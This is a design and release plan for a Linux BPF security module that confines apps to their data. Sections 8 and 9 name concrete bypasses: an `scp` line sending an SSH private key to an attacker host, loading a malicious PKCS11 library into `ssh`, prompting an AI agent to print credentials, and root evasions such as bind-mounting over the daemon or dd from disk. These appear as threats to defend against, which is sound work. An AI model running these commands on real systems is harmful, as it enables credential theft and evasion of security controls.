# Release plan

What is left before explsm can drop the "experimental" warning, and the
features planned after that. Items are in the order they should be done.

## 1. Correctness blockers

1. **Atomic load.** `explsmd/src/main.rs` attaches the programs one by one; a
   failure halfway leaves the earlier ones pinned and enforcing with no
   daemon. Load and verify every program first, attach and pin only when all
   loaded, and on any error remove what was pinned.
2. **Hook arguments by BTF, not by position.** `explsm.bpf.c` reads
   arguments as `ctx[N]`. Use `BPF_PROG()` with typed arguments and
   `bpf_core_*` checks for the hooks whose signature changed between
   kernels (`security_bpf` gained a `kernel` argument after 6.9; check the
   others against each supported kernel). Probe at start-up and refuse to load on an unknown signature.
   State the real minimum kernel in the README.
3. **Atomic policy commit.** `state.rs` `commit` writes about 8 maps in turn.
   Check every map's capacity before writing anything, write into the
   inactive half of a generation-tagged set and flip one `CONFIG` value, or
   at least roll back to the old policy on error.
4. **Tell the user when explsm is not running.** A failed start is silent
   fail-open. Add `fail_closed` (refuse logins until explsmd is up) as an
   option, and have the agent notify on every login while explsmd is down.
5. **Decide on the uncommitted `bprm_committed_creds` change** (an app keeps
   its identity across its own exes, for Chromium's zygote). Commit it with a
   smoke test, or revert it.

## 2. Should-fix

- Deep trees: when the 64-level parent walk runs out, deny (or ask) instead
  of treating the object as unprotected, and don't cache that result.
- Landlock failure and missing D-Bus: options to refuse to start; fix the
  `Type=dbus` restart loop.
- Derive `LAYOUT_VERSION` from the map struct layouts (a hash at build
  time) instead of bumping it by hand.
- Upgrades without a gap: the new explsmd takes over the pinned maps when
  the layout is unchanged, and unloads only when it changed.
- Clear the daemon pid in the kernel config on start, not only on a clean
  exit.
- Test `setns` on a pidfd; close it if it is open.
- Check every map size in the policy compiler, not only the app count.

## 3. Release engineering

- CI (GitHub Actions): `cargo fmt --check`, `clippy -D warnings`,
  `cargo test`, the BPF build, and the smoke tests in a VM on at least the
  oldest supported kernel, the Ubuntu LTS kernel and the newest one
  (virtme-ng or vmtest).
- Pin the toolchain (`rust-toolchain.toml`) and use `--locked` everywhere.
- CHANGELOG.md, SECURITY.md (how to report), CONTRIBUTING.md.
- Man pages for `explsmd(8)`, `explsmctl(8)` and `explsm.policy(5)`.
- Reconcile the README warning with `docs/production-review.md`.
- Measure the overhead (file-heavy workloads: a kernel build, `git status`
  on a large tree) and publish the numbers.
- A signed release: tag, `.deb` built in CI, checksums.
- Done: `publish = false` on every crate; the explsmd licence covers the
  embedded BPF programs (MIT OR GPL-2.0); the Debian copyright file has the
  licence paragraphs.

## 4. Feature: protect personal folders by default

**Deferred** (2026-11-08): not part of the first release.

Goal: `~/Documents`, `~/Pictures`, `~/Videos`, `~/Music`, `~/Desktop` and
`~/Downloads` (the XDG user dirs) are denied to every app unless the user
allows it, with a prompt per app. The file manager and a few system services
have access by default.

Today data belongs to one app (`owns`). This needs a second kind of root:
data that belongs to the **user**, not to an app.

Policy sketch:

```
user-data xdg {                   # resolves the XDG user dirs per user
    dirs  "~/Documents", "~/Pictures", "~/Videos", "~/Music", "~/Desktop"
    mode  ask                     # ask | audit | enforce
}

app files {
    exe "/usr/bin/nautilus"
}
grant files all to xdg
grant @terminal all to xdg        # your shell keeps working
```

Work:

1. **Blocking prompts.** The current prompts are not blocking: the access
   fails and the user retries. That works for `~/.ssh`, not for opening a
   photo in an editor. BPF LSM hooks can't sleep for an answer, but
   fanotify permission events (`FAN_OPEN_PERM`, `FAN_OPEN_EXEC_PERM`) can:
   explsmd marks the user-data roots with fanotify, the BPF side says who is
   asking, and explsmd holds the `open` until the agent answers (with a
   timeout that denies). Keep BPF for everything else (rename, unlink,
   setattr, which fanotify can't stop).
2. **The file chooser as consent.** When the user picks a file in the
   xdg-desktop-portal file chooser, that is the answer already: grant that
   file to that app without a prompt. Apps that use the portal (GTK4 apps,
   Flatpaks, Firefox and Chromium with the portal enabled) would then never
   prompt for files the user opened.
3. **Default grants.** Ship a `user-data.explsm` with the file manager
   (Nautilus), the desktop portals, the document portal, thumbnailers, the
   file indexer (localsearch / tracker-miner) and backup tools (Déjà Dup).
   The indexer and thumbnailers may read only.
4. **Confused deputies.** Nautilus has a D-Bus API (`FileOperations2`) that
   any app can call to copy files. A default grant to Nautilus is a grant to
   every app that can talk to it. Either deny these calls from apps (D-Bus
   policy, or check the caller in an LSM hook on the socket), or accept and
   document it.
5. **Answers per app, remembered**, with a page in the GUI to list and revoke
   them.
6. Rollout: `mode audit` first for a week, as for apps.

## 5. Feature: guarded app binaries

Already in place: an app's exe in a user-writable place is treated as the
app's own data, so other processes of the user can't replace it, add files
next to it or move its folder aside (see `docs/threat-model.md`).

Left to do:

- **Trust on first use.** A path or glob that matches nothing yet is not
  guarded; whatever appears there first becomes the app. Make policy able to
  pin a hash or a signer, or ask the user when an unknown exe first matches.
- **Updates.** An app that updates itself decides its next version. For
  apps with signed updates, check the signature before the new exe gets the
  identity (fs-verity digests, or a hash list the app publishes).
- **Root-owned exes** (`/usr/bin/...`) are trusted because only root can
  change them; say so in the docs and in `explsmctl status`.

## 6. Feature: own GUI for prompts

Replace the desktop notifications with explsm's own dialog: the program, the
data, a per-app history, and Allow once / Allow always / Deny. It is a
security prompt, so:

- **It must not be spoofable or clickable by other apps.** On X11 any client
  can draw over it or send it clicks; on Wayland any app can draw a window
  that looks the same. Add a secret only the user knows (an image chosen at
  setup), require a real key press or click with a short delay, and show
  the prompt only for the app that is in the foreground where possible.
- **Toolkit: GTK4 with libadwaita** (gtk4-rs, libadwaita-rs), decided
  2026-11-08. It matches GNOME (Nautilus, Ptyxis), has mature accessibility
  and Wayland support, and is packaged by every distribution. gpui was
  considered and left out for now: pre-1.0, made for Zed's needs, little
  documentation, and a large GPU dependency tree in a process that answers
  security prompts.
- The agent keeps the logic and the D-Bus link to explsmd; the dialog is a
  separate process it starts, so a crash in the UI never answers a prompt.
- The GTK dialog ships in the desktop package only (see 7), so servers never
  pull in GTK.
- Notifications stay as the fallback when the dialog can't start (no
  Wayland/X11 display, GTK missing).

## 7. Headless edition for servers

explsmd already runs without an agent (denials are only logged), and
`explsmctl status`, `load`, `log` and `learn` are all CLI. What ties explsm
to a desktop is the packaging and some defaults.

Packaging:

- Split the `.deb`: **`explsm`** (explsmd, explsmctl, the system unit, the
  D-Bus policy, docs) and **`explsm-desktop`** (explsm-agent, its user unit,
  the GTK dialog), which depends on `explsm`. A server installs `explsm`
  only; nothing graphical is pulled in.
- `explsm` drops `systemctl --global enable explsm-agent` from `postinst`;
  `explsm-desktop` does it.
- `Before=display-manager.service` is harmless without one; keep it.

Server behaviour:

- **No prompts.** Workflow is audit mode, `explsmctl learn`, grants,
  enforce. A `headless` setting so explsmd doesn't watch for agents and
  `status` doesn't show the agent parts.
- **Alerts instead of prompts.** Denials go to the journal already; add
  forwarding hooks for servers: a rate-limited `EXPLSM_*` field set that
  journald forwarders pick up, an optional metrics endpoint (Prometheus text
  on a Unix socket), and a non-zero `explsmctl status --check` for
  monitoring.
- **D-Bus optional.** Most servers have the system bus, minimal images and
  some containers don't. Offer a Unix-socket control API (root-only,
  `SO_PEERCRED`) used when the bus is absent, and a `Type=notify` unit for
  that case.
- **Root and services.** Root bypasses explsm by default, and many server
  daemons run as root. Section 8 replaces the bypass; with it, a root daemon
  can be an app and be confined to its data.
- **Service identities.** Server apps are services: allow naming an app by
  its systemd unit as well as by exe (`unit "postgresql@*.service"`),
  resolved through the cgroup the process runs in.
- **Containers.** Processes in rootless containers or user namespaces can't
  be explsm apps (`docs/threat-model.md`). Document that, and test that
  rootful Docker/Podman containers get the identity of their exe.
- **Example policies** for common server data: `/etc/ssl/private` (for the
  web server), `/var/lib/postgresql`, `/root/.ssh`, backup credentials.
- **No graphical fallback** in the recovery docs: `explsm=off` through the
  serial console or the cloud provider's boot settings.

## 8. Resistance to root

Plan only; nothing here is implemented yet.

### Where it stands

- `root_bypass on` is the default (`docs/dsl.md`): any process with fsuid 0
  passes every check except label changes and `EXDEV`, may change explsm's
  own files, and may ptrace and signal app processes
  (`explsm.bpf.c` `missing()`, `may_tamper()`). Anything that gets sudo gets
  everything.
- `root_bypass off` already exists. Root then can't read apps' data, edit
  the policy or tamper with apps, but `docs/production-review.md` lists the
  ways around it: bind-mounting another binary over `/usr/sbin/explsmd` in a
  mount namespace (a running daemon accepts a new binary at its path, for
  upgrades), loading a kernel module, reading raw block devices, and
  `explsmctl unload`, which root may always run.
- Package upgrades rely on the bypass: dpkg writes explsm's files as root.

The goal is the SELinux/AppArmor model: root is a subject like any other,
and what it may do is in the policy. Like those, explsm can't hold against
a kernel exploit or against someone who controls the boot; the plan makes
everything short of that fail, and makes the boot part depend on Secure
Boot.

### Stage 1: root is a subject, not a bypass

1. **`@root` as a grant subject.** `grant @root read, list to ssh` works
   like `@unconfined`, for processes with fsuid 0 that are no app. Root
   processes that are apps (a root daemon named by `exe`) get their app's
   rights only, not root's.
2. **`root_bypass off` becomes the default**, with a release note. The
   example policies grant `@root` what admins expect (`list` everywhere,
   `read` on server data where backups need it).
3. **Package managers as an app.** `app dpkg { exe "/usr/bin/dpkg" ... }`
   granted write to explsm's own files, so upgrades work without the
   bypass. dpkg runs maintainer scripts as root, so this is a grant to
   whatever package root installs; stage 2 closes that.
4. **Admin sessions.** A root shell on a tty or over ssh is `@root` plus the
   `@terminal` grants, so an admin can still look at data on purpose, and
   it is logged with the login (`loginuid`, the session id).
5. **Audit before enforce.** `root_bypass audit`: root keeps access, every
   use of the bypass is logged, and `explsmctl learn @root` turns a week of
   it into grants.

### Stage 2: close the ways around explsm

Each one an LSM hook, applied to every process that is not explsmd (root
included), unless the policy grants it:

- **The daemon's identity by content, not by path.** Today a new binary at
  explsmd's path is let in after an upgrade. Instead, accept a new explsmd
  only if its fs-verity digest or signature matches a key compiled into
  the running one (or pinned at first start). The bind-mount trick then
  gets nothing.
- **Kernel code**: `kernel_load_data` / `kernel_read_file` (modules, kexec,
  firmware from odd paths) only for `modprobe` / `systemd-udevd` reading
  from `/usr/lib/modules`, and with module signing enforced.
- **Raw access to data**: `file_open` on block devices that hold protected
  roots, `/dev/mem`, `/dev/kmem`, `/dev/port`, `/proc/kcore` denied except to
  granted apps (`fsck`, `mkfs`, the bootloader tools).
- **Other BPF**: `bpf` `BPF_PROG_LOAD` of kprobe, fentry, tracing and LSM
  programs only for granted apps; perf_event_open with kernel tracing
  likewise. Tracing programs can read kernel memory, and with it file
  contents in the page cache.
- **Mounts**: `sb_mount`, `move_mount` and `sb_umount` over or under a
  protected root, and over explsm's own files, denied. Mounting the same
  filesystem elsewhere is fine: its inodes keep their labels.
- **Debug interfaces**: debugfs, `/sys/kernel/tracing`, `/proc/sys/kernel/*`
  writes that weaken the kernel (`kptr_restrict`, `yama`, `modules_disabled`
  stays allowed since it only goes one way).
- **Kernel lockdown.** Most of the above is what `lockdown=integrity` /
  `confidentiality` does. Recommend Secure Boot with lockdown, check it at
  start-up, show it in `explsmctl status`, and let `require_lockdown on`
  refuse to run (or warn on every login) without it.

### Stage 3: policy and unload only with the admin's key

- **Signed policy.** In `locked` mode explsmd loads only policy files signed
  with an admin key whose public half was set at install; the private key
  is kept off the machine. Root can still write files but can't make
  explsmd load them. Claims written by the agent are signed by explsmd's own
  key (in its state, readable by it only).
- **Unload needs the key too**: `explsmctl unload` asks for a token signed by
  the admin key over a nonce from explsmd. Without it, the only way out is a
  reboot with `explsm=off`.
- **The boot.** `explsm=off` stays the recovery route, so whoever controls
  the boot controls explsm, as with `selinux=0`. With Secure Boot, a signed
  unified kernel image and a locked command line (or a GRUB password), that
  is the physical/console owner, not root. Document the setups that are
  root-resistant and the ones that are not.
- **Package upgrades** in locked mode: only `.deb`s whose explsm files carry
  the release signature are let in (fs-verity or a signed manifest the
  daemon checks before the new files get the `APP_DAEMON` owner).

### Open questions

- Whether `root_bypass off` by default is acceptable for the first
  release, or ships in audit mode first (stage 1.5).
- How an admin recovers a locked machine when the key is lost (reinstall,
  or boot with `explsm=off` and Secure Boot's own recovery).
- Whether to integrate with an existing signing scheme (IMA/EVM appraisal,
  fs-verity with the kernel's keyring) instead of explsm's own keys.

### Testing

Each way around explsm above gets a smoke test that runs it as root and
expects the denial: bind-mount over explsmd, `insmod` of an unsigned module,
`dd` from the disk, a kprobe reading a file, `explsmctl unload` without a
token, editing the policy.

## 9. Who started the app

Plan only; nothing here is implemented yet. Comes after section 8 stage 2.

### The problem

Identity is per exe, so whoever can start an owner app can use it. Malware
doesn't have to get into the app; it runs it:

- **The app run with the attacker's arguments.**
  `scp ~/.ssh/id_ed25519 attacker:` is the real `scp` with the `ssh`
  identity, and it sends the key away.
- **Foreign code loaded by the app itself.**
  `ssh -o PKCS11Provider=/tmp/evil.so` makes the real `ssh` load a library
  the attacker chose, which then runs with the `ssh` identity.
- **Apps that act on instructions.** `claude -p "print the credentials"`
  does the exfiltration itself, on request.

`docs/threat-model.md` covers code inside the app (plugins, `eval`), not
someone else starting it. Add a limitation, "anyone who can start an owner
app can use it", with these three cases.

### 9.1 Only trusted code in an app

`mmap_file` and `file_mprotect` hooks: an app process may map a file as
executable only if the file can be changed by root alone, or belongs to the
app (its exe, its protected folders). Covers `PKCS11Provider`,
`SecurityKeyProvider`, Python and Node modules from user-writable paths, and
backs up the loader-variable check. Anonymous executable memory (JITs) is
left alone. The rule is per app (`code trusted` by default, `code any` to
turn it off for apps that load plugins from the user's folders), so it can
be rolled out in audit mode first.

### 9.2 `started_by`

The app gets its identity only when it was started by something the policy
trusts; otherwise the process runs as no app.

```
app ssh {
    exe "/usr/bin/ssh", "/usr/bin/scp"
    owns "~/.ssh"
    started_by @terminal, @desktop, backup
}
```

- **The spawner, not the parent.** The kernel re-parents a process when its
  parent exits (to `systemd --user`, a subreaper), so the parent at exec
  time can be chosen by the attacker. `task_alloc` records the identity of
  the task that forked the process in its task storage, and the check uses
  that. It never changes.
- **Identities, not names.** The spawner is an explsm identity (from its
  exe, checked by the kernel), so `comm` and `argv[0]` don't matter.
- **`@terminal` means typed in a shell.** Today `TF_TERMINAL` is inherited
  by everything below a terminal, including `npm install`'s postinstall
  scripts (ptyxis → bash → node → sh → scp). Add a flag that is cleared on
  any exec below the terminal that is not a shell named in policy
  (`shell "/usr/bin/bash", …`). `started_by @terminal` needs the flag, so a
  chain of shells only is accepted.
- **`@desktop`** is GNOME Shell (by exe) launching an app. Other programs
  can't make it run arbitrary code since GNOME 41, but it launches what
  `.desktop` files say, see 9.3.
- **Launchers that start things on request are not trusted**, and the docs
  say so: `systemd --user` (`systemd-run --user`, unit files in
  `~/.config/systemd/user`), D-Bus activation
  (`org.freedesktop.Application.Activate`), gnome-session (autostart),
  gnome-terminal-server (opens a terminal for any caller), `xdg-open`,
  `gio launch`. Naming one in `started_by` is a warning.
- A failed `started_by` is logged (`dropped=started_by spawner=…`), and in
  audit mode only reported, like the loader-variable checks.

### 9.3 Protect what launches things

`started_by` is only as good as what the trusted spawners run. Protected by
default (owned by explsm's own `launch` owner, changed only by apps the
policy grants, e.g. the desktop's settings and an editor the user names):

- `~/.local/share/applications` (a `.desktop` file there overrides the
  system one with the same name)
- `~/.config/autostart`
- `~/.config/systemd/user`
- shell startup files: `~/.bashrc`, `~/.profile`, `~/.bash_profile`,
  `~/.zshrc`, `~/.config/fish/` (a script that writes one makes the user's
  own shell run its command)

### 9.4 Ask at launch

For apps with `started_by`, a launch that fails the check can be put to the
user instead of failing silently. It can wait for the answer: explsmd marks
the app's exes with fanotify `FAN_OPEN_EXEC_PERM` and holds the exec until
the agent answers (timeout: deny). The prompt names the spawner and the
command line. Answers: allow once, always allow this spawner, deny.

### 9.5 Option rules (backstop)

Per app, options that drop the identity when present in `argv`
(`deny_args "-o PKCS11Provider*", "-I", "-F"` for ssh). Easy to get around
with other spellings, so only for known code-loading or redirecting options,
and documented as such. Reading `argv` needs `bprm->p` / the new mm's arg
pages in `bprm_committed_creds`.

### 9.6 Policy guidance

- **ssh:** keep keys out of `ssh`/`scp`'s reach: `ssh-agent` owns
  `~/.ssh/id_*`, `ssh`/`scp` get keys only through the agent, with
  `ssh-add -c` (confirm each use) or a FIDO key (touch). explsm protects the
  agent and its socket. Example policy in `packaging/`.
- **Apps that act on instructions** (AI agents, shells, interpreters) lend
  their identity to anyone who can start them. `started_by @terminal` stops
  background malware, not a script the user ran in that terminal. Say so in
  the README next to the `~/.claude` example.

### Testing

Smoke tests, each expecting the identity to be dropped (or the prompt):
`scp` spawned by a script interpreter, by a double-forked orphan, by
`systemd-run --user`; `ssh -o PKCS11Provider=/tmp/x.so`; a `.so` from
`/tmp` loaded with `dlopen`; writing `~/.bashrc` and
`~/.local/share/applications/*.desktop` from an unconfined process.
